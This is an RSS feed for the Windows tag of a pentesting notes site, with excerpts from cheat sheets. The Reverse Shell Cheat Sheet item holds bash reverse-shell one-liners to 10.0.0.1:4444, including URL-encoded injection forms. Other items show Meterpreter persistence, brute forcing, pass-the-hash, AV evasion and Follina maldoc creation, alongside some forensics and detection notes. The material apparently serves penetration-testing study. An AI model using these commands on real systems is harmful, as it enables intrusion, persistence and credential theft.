@@ -1,0 +1,159 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/windows/</link>
+    <description>Recent content in Windows on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reverse Shell with Pwncat</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
+      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
+    </item>
+    <item>
+      <title>Windows Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</guid>
+      <description>Automation linkWe might be able to find vulnerabilities on target Windows machine with automation tools as below:&#xA;WinPEAS wesng (Windows Exploit Suggester Next Generation) PrivescCheck LOLBAS (Living Off the Land Binaries, Scripts and Libraries) linkLOLBAS provides misuses tools and executables already in the Windows system. So check the website.&#xA;OS Information link hostname systeminfo systeminfo | findstr &amp;#34;OS&amp;#34; ver [System.Environment]::OSVersion.Version # Datetime Get-Date Interesting Information link # Current user whoami whoami /user whoami /groups whoami /priv whoami /all echo %username% # List users net user net users net user USERNAME Get-LocalUser # List groups net group net localgroup # List users in specific group net localgroup &amp;#34;Remote Management Users&amp;#34; # List user home directories Get-ChildItem C:\Users -Force # Network ipconfig ipconfig /all route print arp -A Get-NetAdapter # Firewall netsh firewall show state netsh firewall show config netsh advfirewall show allprofiles # PowerShell info Get-Host $Host $PSVersionTable # Display only the PowerShell version.</description>
+    </item>
+    <item>
+      <title>MSSQL (Microsoft SQL) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/mssql-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/mssql-pentesting/</guid>
+      <description>Enumeration link nmap --script ms-sql-info -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-config -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-* -p 1433 &amp;lt;target-ip&amp;gt; # MSDAT: https://github.com/quentinhardy/msdat # all: Enumerate with all modules python3 msdat.py all -s example.com # -D, -U, -P: Use Windows authentication python3 msdat.py all -s example.com -D domain -U username -P password # xpdirectory: List directories in system python3 msdat.py xpdirectory -s manager.htb -D manager -U operator -P operator -d master --list-files &amp;#39;C:\&amp;#39; # bulkopen: Read/download files python3 msdat.</description>
+    </item>
+    <item>
+      <title>Reverse Shell Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
+      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
+    </item>
+    <item>
+      <title>Active Directory Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/</link>
+      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/</guid>
+      <description>Enumeration link # Domain Controllers (DNS) discovery dig @&amp;lt;target-ip&amp;gt; &amp;lt;domain-name&amp;gt; any ffuf -u https://FUZZ.example.com -w subdomains.txt -mc 200,301,302,403 gobuster dns -d example.local -w subdomains.txt -t 25 Using BloodHound linkReference: BloodHound&#xA;# https://github.com/dirkjanm/BloodHound.py bloodhound-python -d example.local -dc example.local -ns &amp;lt;nameserver-ip&amp;gt; -u &amp;#39;username@example.local&amp;#39; -p &amp;#39;password&amp;#39; # https://github.com/NH-RED-TEAM/RustHound.git rusthound -d example.local -u &amp;#39;usrname@example.local&amp;#39; -p &amp;#39;password&amp;#39; -i 10.0.0.1 --zip # --ldaps: Force LDAPS rusthound -d example.local -u &amp;#39;usrname@example.local&amp;#39; -p &amp;#39;password&amp;#39; -i 10.0.0.1 --zip --ldaps Automation link Seatbelt Investigation link # List all users net user /domain net user &amp;lt;username&amp;gt; /domain Get-ADUser -Filter * Get-ADUser -Identity &amp;lt;username&amp;gt; -Server dc.</description>
+    </item>
+    <item>
+      <title>Download Files in Windows</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/technique/download-files-in-windows/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/technique/download-files-in-windows/</guid>
+      <description>Using Invoke-WebRequest linkWe can use Invoke-WebRequest command&#xA;# In PowerShell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt # In CMD, we need to call `powershell` or `powershell.exe` command. powershell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt powershlel IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt </description>
+    </item>
+    <item>
+      <title>PE (Portable Executable) Analysis</title>
+      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</guid>
+      <description>Investigation link file example.exe strings example.exe PE Headers linkThere are many tools to analyze PE headers, such as wxHexEditor, pe-tree.&#xA;pe-tree is a tool that views PE files in a tree-view. It will take about a few minutes to open.&#xA;pe-tree ./executable Structure Description IMAGE_DOS_HEADER It consists of the first 64 bytes of the PE file. The first two bytes (”4D 5A”) means the “MZ” characters which are an identity of the Portable Executable format.</description>
+    </item>
+    <item>
+      <title>MSRPC (Microsoft Remote Procedure Call) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/</link>
+      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/</guid>
+      <description>Enumeration link nmap --script msrpc-enum -p 135 &amp;lt;target-ip&amp;gt; # rpcdump for dumping RPC endpoints impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; | grep -E &amp;#39;MS-RPRN|MS-PAR&amp;#39; If we found MS-RPRN or MS-PAR, we might be able to exploit with PrintNightmare.&#xA;Metasploit link msfconsole msf&amp;gt; use auxiliary/scanner/dcerpc/endpoint_mapper msf&amp;gt; use auxiliary/scanner/dcerpc/hidden msf&amp;gt; use auxiliary/scanner/dcerpc/management msf&amp;gt; use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor Investigation linkrpcinfo reports RPC information.</description>
+    </item>
+    <item>
+      <title>WinRM (Windows Remote Management) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</guid>
+      <description>Enumeration linkBrute Force Credentials link # CrackMapExec poetry run crackmapexec winrm &amp;lt;target-ip&amp;gt; -d DomainName -u usernames.txt -p passwords.txt # Metasploit msfconsole msf &amp;gt; use auxiliary/scanner/winrm/winrm_login Evil-WinRM linkEvil-WinRM is a Windows Remote Management shell for pentesting.&#xA;Below are list of commands for each situation.&#xA;Connect link evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password # -P: Specifify port evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -p password # Pass The Hash (-H) evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc # PowerShell Local Path (-s) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -s /opt/scripts # SSL enabled (-S) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -S If you have private key and public key, you can use them for authentication.</description>
+    </item>
+    <item>
+      <title>M365 (Microsoft Office 365) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/</link>
+      <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/</guid>
+      <description>Enumeration linkPassword Spraying linkWe may spray user passwords with open-source tools as below.&#xA;MFASweap o365spray </description>
+    </item>
+    <item>
+      <title>Malware Detection on Windows</title>
+      <link>https://documentnation.github.io/docs/hdks/malware/malware-detection-on-windows/</link>
+      <pubDate>Sun, 06 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/malware/malware-detection-on-windows/</guid>
+      <description>Checking Established Network linkThis process refers to this article. Please see it for more details.&#xA;1. List Network Processes linkWhat first we need to check is to see the network status on Command Prompt.&#xA;# -a: Show all connections # -n: Show ip addresses and ports as number # -o: Show process ID netstat -ano Especially, &amp;ldquo;ESTABLISHED&amp;rdquo; status might be suspicious to be connected attackers server. So we need to investigate the IP address which is connected with our machine.</description>
+    </item>
+    <item>
+      <title>Windows Print Spooler Service</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</link>
+      <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</guid>
+      <description>Investigation link # Check if the Print Spooler service is running Get-Service -Name Spooler Detection linkServices link Open Services. We can find the Print Spooler on the Right Pane. Double-click on it and see the details. Malicious DLL Location link C:\Windows\System32\spool\drivers\x64\3\ Event Viewer linkOpen Event Viewer, and find event logs in the following directory in the left pane.&#xA;If you want to filter by Event ID, use &amp;ldquo;Filter Current Log&amp;rdquo; in the right pane.</description>
+    </item>
+    <item>
+      <title>AV (Antivirus) Evasion</title>
+      <link>https://documentnation.github.io/docs/hdks/malware/antivirus-evasion/</link>
+      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/malware/antivirus-evasion/</guid>
+      <description>Online Scanner linkWe can check if our payload is detected by antivirus.&#xA;AntiScan </description>
+    </item>
+    <item>
+      <title>WSL Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/</link>
+      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/</guid>
+      <description>Interesting Files link cat /etc/wsl.conf Escape WSL to Windows Host Machine linkIf we’are currently on WSL machine, we can access to the host Windows machine as below.&#xA;cd /mnt/c/ If /mnt/c/ is empty, we need to mount the folder by running the following command.&#xA;cd / # -t: Limit the set of filesystem types # drvfs: A plugin for WSL # C: : Specify the Windows root mount -t drvfs C: /mnt/c </description>
+    </item>
+    <item>
+      <title>Windows Forensics</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/forensics/</link>
+      <pubDate>Tue, 04 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/</guid>
+      <description>System Information linkIP Address &amp;amp; MAC Address linkBelow are the location of the file which contains the information of IP address and MAC address.&#xA;# Look@LAN is a network monitoring tool. So if the system uses the tool, we can retrieve the information of the network. # LANIP -&amp;gt; IP address # LANNIC -&amp;gt; MAC address c:\Program Files (x86)\Look@LAN\irunin.ini Network Cards linkThe name of the network card is such like “Intel(R) PRO/1000 MT Desktop Adapter”.</description>
+    </item>
+    <item>
+      <title>Microsoft Outlook Message (.msg)</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/service/microsoft-outlook-message/</link>
+      <pubDate>Fri, 10 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/service/microsoft-outlook-message/</guid>
+      <description>Decrypt &amp;amp; Open in Linux link sudo apt-get install libemail-outlook-message-perl libemail-sender-perl msgcovert example.msg open example.eml Extract Attached Files linkIf the message is attached some file e.g. .zip, we can extract the file.&#xA;1. In CyberChef, paste the text contains Base64 encoded. linkFor example,&#xA;Content-ID: Content-Type: application/octet-stream; name=example.zip Content-Disposition: attachment; filename=example.zip Content-Transfer-Encoding: base64 UEsDBBQAAAAIAJBsAVWzNSwXM3oTAAAQ8QANAAAAc2VjdXJpdHkuZXZ0eOxdCXxVxdU/b8nLRhZk R5aAoqINJISwChISAlSQCEHFUjCQxABJwCTsLnHBtSpabW2t1rpVu1g/97pVa22prRqXKrW0ta1t ... 6Vf33X5WvnNm5rx7373vvnffct97I== 2. Attach “Base64” and “Extract Files” operations. linkAfter baking, we should get the attached file and download it.</description>
+    </item>
+    <item>
+      <title>PowerShell</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/powershell/powershell/</link>
+      <pubDate>Sun, 05 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/powershell/powershell/</guid>
+      <description>Start PowerShell linkOn Linux link pwsh # Execute PS commands without entering shell. pwsh -Command &amp;lt;cmdlet&amp;gt; On Windows link powershell # Bypass ExecutionPolicy powershell -ep bypass # check for the result PS&amp;gt; Get-ExecutionPolicy Commands linkOS Information link $PSVersionInfo Change Directory link&amp;lsquo;cd&amp;rsquo; in Linux.&#xA;Set-Location -Path c:\Users\Administrator\Desktop List Files link&amp;rsquo;ls&amp;rsquo; in Linux.&#xA;Get-ChildItem -File -Hidden Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Get-ChildItem -Directory -Hidden Get-ChildItem -Directory -Hidden -Recurse -Filter &amp;#39;*secret*&amp;#39; -ErrorAction SilentlyContinue Get-ChildItem -Path .</description>
+    </item>
+    <item>
+      <title>Metasploit Cheat Sheets</title>
+      <link>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</link>
+      <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</guid>
+      <description>Msfconsole linkNo content yet.&#xA;Meterpreter link # List all sessions running on background msf&amp;gt; sessions # Start interacting with the session msf&amp;gt; sessions &amp;lt;session-id&amp;gt; # Drop into a system command shell meterpreter&amp;gt; shell # Upgrade to full functional shell python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Persistence at the target system # -h: Help meterpreter&amp;gt; run persistence -h # -U: Automatically start when the user logs on # -i: The interal in seconds between each connection attempt # -p: The port on which the system running Metesploit is listening # -r: The IP of the system running Metasploit listening for the connect back meterpreter&amp;gt; run persistence -U -i 5 -p 443 -r &amp;lt;local-ip&amp;gt; Msfvenom linkNo content yet.</description>
+    </item>
+    <item>
+      <title>RDP (Remote Desktop Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/</link>
+      <pubDate>Mon, 26 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/</guid>
+      <description>Enumeration link nmap --script rdp-enum-encryption -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp-ntlm-info -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp* -p 3389 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; rdp hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; rdp Connect linkRemmina linkRemmina is a remote desktop client for POSIX-based computer operating systems.&#xA;remmina # -c: Connect given URI or file remmina -c rdp://username@vulnerable.com remmina -c rdp://domain\\username@vulnerable.com remmina -c rdp://username:password@vulnerable.com # --------------------------------------------------------------------------------- # Settings # Keyboard mapping 1.</description>
+    </item>
+    <item>
+      <title>PowerView</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/powershell/powerview/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/powershell/powerview/</guid>
+      <description>Enabling PowerView on PowerShell link Import-Module .\PowerView.ps1 To start PowerView&#xA;. .\PowerView.ps1 Enumeration link # List domain users Get-NetUser | select cn # List domain groups Get-NetGroup -GroupName *admin* # Get shared folders Invoke-ShareFinder # Get operating systems running Get-NetComputer -fulldata | select operatingsystem # Find files or directories Get-ChildItem -r -Filter &amp;#34;*.txt&amp;#34; -Name </description>
+    </item>
+    <item>
+      <title>Microsoft Word Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/service/microsoft-word-pentesting/</link>
+      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/service/microsoft-word-pentesting/</guid>
+      <description>Follina MSDT (CVE-2022-30190) linkMicrosoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.&#xA;1. Download the Payload in Local Machine linkClone the payload from msdt-follina.&#xA;2. Create the Maldoc in Local Machine link # -i: interface name python3 follina.py -i eth0 Then a new maldoc named “follina.doc” will be created in the current directory.&#xA;Now you’ve started the web server.&#xA;3. Open Another Web Server in Local Machine linkOpen another terminal and move to the msdt-follina directory, then start web server to transfer the maldoc to target machine.</description>
+    </item>
+  </channel>
+</rss>
